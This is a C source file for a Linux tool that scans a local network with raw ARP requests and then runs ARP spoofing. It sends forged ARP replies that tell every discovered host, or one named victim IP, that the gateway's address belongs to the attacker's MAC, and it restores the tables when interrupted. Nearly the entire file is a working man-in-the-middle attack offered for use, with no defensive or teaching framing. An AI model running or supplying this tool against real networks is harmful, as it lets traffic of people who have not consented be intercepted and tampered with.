#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <signal.h>
#include <sys/wait.h>
#include <pthread.h>
#include "util.h"

#define BUF_SIZE 4096
#define DEFAULT_HOST 65536 //Unrealistic, but...

typedef struct
{
	unsigned int ip; //Network address + Host address
	unsigned int subnet;
	unsigned char mac[6]; //Vendor code + LAN serial
}host;

void scanning(int);
void spoofing(int);
typedef void (*routine)(int); //Above function pointer
static routine actions[3] = {scanning, spoofing, NULL};

static int interface_index; //using network interface index
static unsigned int vip; //Virtual IP for host scan
static unsigned int victim; //Victim IP

static host this; //This machine
static host gateway; //Default gateway
static host * host_list[DEFAULT_HOST]; //Other hosts

static int spoof_continue = 1;
static int no_print;

int param_parse(int argc, char * argv[])
{
	static const char * usage = 
		"#./arp interface hostscan {virtual source ip}\n" 
		"#./arp interface spoof {virtual source ip} {victim ip}\n\n"
		"If you want to use only victim ip, put the virtual source ip as \'0.0.0.0\'\n";

	int ret, idx = 2;

	if (argc == 1) //There are no other commands,
	{
		printf("Usage\n%s", usage);
		exit(-1);
	}

	interface_index = if_nametoindex(argv[1]);
	if (!interface_index || argc == 2)
	{
		if (!interface_index)
			perror("if_nametoindex() error");
		else
			printf("Usage\n%s", usage);
		exit(-1);
	}
	else
	{	
		
		if (!strcmp(argv[idx], "hostscan"))
		{
			ret = 0;
		}
		else if (!strcmp(argv[idx], "spoof"))
		{
			ret = 1;	
		}
		else
		{
			printf("Invalid parameter: %s\n", argv[idx]);
			exit(-1);
		}
	}

	if (idx + 1 < argc)
		vip = inet_addr(argv[idx + 1]);
	if (idx + 2 < argc)
		victim = inet_addr(argv[idx + 2]);

	return ret;	
}

int init_base(const char * if_name)
{
	struct ifreq ifr;
	int sock;
			
	sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if (sock < 0) //socket 사용 가능 여부 확인
		goto socket_err;

	if (get_gateway(interface_index, &gateway.ip, gateway.mac) < 0) //ref, util.c
		goto gateway_err;
	
	printf("\n-----Default Gateway-----\n---> %s [%s]\n\n", 
			inet_ntoa(*(struct in_addr *)&gateway.ip), 
			ether_ntoa_e((gateway.mac))); //ref, util.c

	//must need interface name, dev_get_by_name();
	memcpy(ifr.ifr_name, if_name, sizeof(ifr.ifr_name));

	//IP address
	ioctl(sock, SIOCGIFADDR, &ifr);
	memcpy(&this.ip, &ifr.ifr_addr.sa_data[2], sizeof(this.ip));

	//Netmask
	ioctl(sock, SIOCGIFNETMASK, &ifr);
	memcpy(&this.subnet, &ifr.ifr_netmask.sa_data[2], sizeof(this.subnet));

	//MAC address
	ioctl(sock, SIOCGIFHWADDR, &ifr);
	memcpy(this.mac, &ifr.ifr_hwaddr.sa_data, sizeof(this.mac));

	close(sock);

	return 0;

socket_err:
	perror("socket() error");
	goto finish;
gateway_err:
	perror("get_gateway() error");
free_sock:
	close(sock);
finish:
	exit(-1);
}

unsigned char * create_arp_packet(unsigned char * buf, unsigned short op, 
				unsigned char * host, unsigned int src,
				unsigned char * target, unsigned int dest)
{
	unsigned char * ptr;
	struct ethhdr * eth;
	struct arphdr * arp;

	eth = (struct ethhdr *)buf;
	//set ethernet header
	memcpy(eth->h_source, host, 6); //MAC address length
	if (!target)
		memset(eth->h_dest, 0xff, 6); //broadcast
	else
		memcpy(eth->h_dest, target, 6);
	eth->h_proto = htons(ETH_P_ARP);

	arp = (struct arphdr *)(eth + 1);
	//set arp header
	arp->ar_hrd = htons(1); //Ethernet
	arp->ar_pro = htons(ETH_P_IP); //IPv4
	arp->ar_hln = 6; //hw address length
	arp->ar_pln = 4; //ip address length
	arp->ar_op = htons(op);

	ptr = (unsigned char *)(arp + 1);
	//payload
	memcpy(ptr, host, 6); //sha
	ptr += 6;
	memcpy(ptr, &src, 4); //spa
	ptr += 4;
	if (!target) //tha
		memset(ptr, 0, 6); //who is target?
	else
		memcpy(ptr, target, 6);
	ptr += 6;
	memcpy(ptr, &dest, 4); //tpa

	return buf;
}

void reply_handle_cleanup(void * arg)
{
	int * args = (int *)arg;
	if (args[0] == 2)
	{
		close(args[1]);
	}
}

//Thread routine
void * reply_handle(void * arg)
{
	unsigned char buf[BUF_SIZE], * ptr;
	struct arphdr * arp;
	int sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	int * ptr_tot = (int *)arg;
	char vendor[32];

	//unsigned char message[1024];

	int args[] = {0, sock};
	args[0] = sizeof(args) / sizeof(int);
	
	pthread_cleanup_push(reply_handle_cleanup, args); //---Push---
	*ptr_tot = 0; //reset

	while (1)
	{
		int len = recvfrom(sock, buf, BUF_SIZE, 0, NULL, NULL);
		unsigned int nr;
		host * target;

		if (len <= 0)
		{
			perror("recvfrom() error\n");
			break;
		}

		buf[len] = 0;
		ptr = buf;
		ptr += sizeof(struct ethhdr); //go to arp header
		arp = (struct arphdr *)ptr;
	
		if (ntohs(arp->ar_op) != ARPOP_REPLY)
			continue;

		ptr += sizeof(struct arphdr); //go to arp payload
		ptr += 6; //spa

		nr = (*(unsigned int *)ptr);
		nr = ntohl(nr & ~this.subnet); //host address
		if (host_list[nr]) //Already exist
			continue;

		host_list[nr] = (host *)malloc(sizeof(host));
		target = host_list[nr];

		get_vendor(vendor, ptr - 6);

		if (!no_print)
		{
			printf("%s\t[%s]\t[%s]\n", 
					inet_ntoa(*(struct in_addr *)ptr), //IP address
					ether_ntoa_e((ptr - 6)), vendor); //MAC address
		}

		memcpy(&target->ip, ptr, 4);
		memcpy(target->mac, ptr - 6, 6);
	
		(*ptr_tot) += 1;	
	}	

	pthread_cleanup_pop(0); //---Pop---
	return NULL;
}

void scanning(int idx)
{
	unsigned int host = 1;
	unsigned int network_addr = this.ip & this.subnet;
	unsigned int max = ntohl(~this.subnet);
	unsigned int which;

	unsigned char buf[BUF_SIZE];
	struct sockaddr_ll device;
	int delay = 1000, pkt_size = sizeof(struct ethhdr) + sizeof(struct arphdr) + 20;
	int arp_sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));

	int * tot = (int *)malloc(sizeof(int));
	pthread_t tid;

	memset(&device, 0, sizeof(device));
	device.sll_ifindex = idx;
	device.sll_halen = ETH_ALEN;
	memset(device.sll_addr, 0xff, 6); //broadcast
	
	if (vip == 0)
		which = this.ip;
	else
		which = vip;

	if (max > 8192) //unrealistic
		max = 8192;

	printf("\tHost Scanning Start...\n\n");

	pthread_create(&tid, NULL, reply_handle, tot);
	while (host <= max)
	{
		unsigned int target = network_addr | htonl(host++);

		create_arp_packet(buf, ARPOP_REQUEST, this.mac, which, NULL, target);
		sendto(arp_sock, buf, pkt_size, 0, (struct sockaddr *)&device, sizeof(device));
		usleep(delay);
	}
	sleep(5); //wait for reply packets,

	printf("\nThere are [%d] hosts, Except you\n", *tot);
	printf("\n\tHost Scanning Finished\n");

	pthread_cancel(tid);
	pthread_join(tid, NULL);
	close(arp_sock);
	free(tot);
}

void sighandle(int sig)
{
	if (sig == SIGINT)
	{
		spoof_continue = 0;
	}
}

void * spoof_unit(void * arg)
{	
	unsigned char buf[BUF_SIZE]; //Not be shared!
	struct sockaddr_ll device;

	int * args = (int *)arg;
	int if_index = args[0], t = args[1], arp_sock = args[2];
	int pkt_size = sizeof(struct ethhdr) + sizeof(struct arphdr) + 20;
	int cnt;

	memset(&device, 0, sizeof(device));
	device.sll_ifindex = if_index;
	device.sll_halen = ETH_ALEN;
	memcpy(device.sll_addr, host_list[t]->mac, 6);

	printf("Host: %d Spoofing START\n", t);

	//create_arp_packet()이 loop밖에서 한번 초기화 시키고  재사용하면 잘 안되는 듯.
	while (spoof_continue)
	{
		create_arp_packet(buf, ARPOP_REPLY, this.mac, gateway.ip, host_list[t]->mac, host_list[t]->ip);
		sendto(arp_sock, buf, pkt_size, 0, (struct sockaddr *)&device, sizeof(device));
		sleep(3);
	}

	//restore packet	
	for (cnt = 0; cnt < 2; cnt++)
	{
		create_arp_packet(buf, ARPOP_REPLY, gateway.mac, gateway.ip, host_list[t]->mac, host_list[t]->ip);
		sendto(arp_sock, buf, pkt_size, 0, (struct sockaddr *)&device, sizeof(device));
		usleep(100);
	}

	free(args);
	return NULL;
}

void spoofing(int idx) //default is for all hosts
{
	int t;
	unsigned char buf[BUF_SIZE];
	unsigned int max = ntohl(~this.subnet);
	int arp_sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	int * args;
	pthread_t * tids, tid;

	no_print = 1; //no output about scannnig
	scanning(idx);

	if (max > 8192)
		max = 8192;

	signal(SIGINT, sighandle);
	tids = malloc(sizeof(pthread_t) * max);
	memset(tids, 0, sizeof(pthread_t) * max);

	printf("\n\n\tARP Spoofing Start\n\n");

	for (t = 1; t <= max; t++)
	{		
		if (!host_list[t]) //No host,
			continue;
		if (host_list[t]->ip == gateway.ip)
			continue;

		if (victim && host_list[t]->ip != victim)
			continue;

		args = (int *)malloc(sizeof(int) * 3);
		args[0] = idx; args[1] = t; args[2] = arp_sock;

		if (!pthread_create(&tid, NULL, spoof_unit, args))
			tids[t] = tid;
		else
		{
			perror("pthread_create() error");
			free(args);
		}
	}
	printf("\tPress CTRL-C for termination\n");

	while (spoof_continue)
		sleep(1);
	printf ("\tTake a Moment Plz\n");

	for (t = 1; t <= max; t++)
	{
		if (!tids[t])
			continue;
		pthread_join(tids[t], NULL);
	}

	printf("\tARP Spoofing Stop\n");

	free(tids);
	close(arp_sock);
}

int main(int argc, char * argv[])
{
	int idx, func;

	func = param_parse(argc, argv);

	idx = init_base(argv[1]);

	vendor_init("mac-vendor.txt");

	actions[func](interface_index);	
	
	for (idx = 0; idx < DEFAULT_HOST; idx++)
	{
		if (host_list[idx])
			free(host_list[idx]);
	}

	return 0;
}
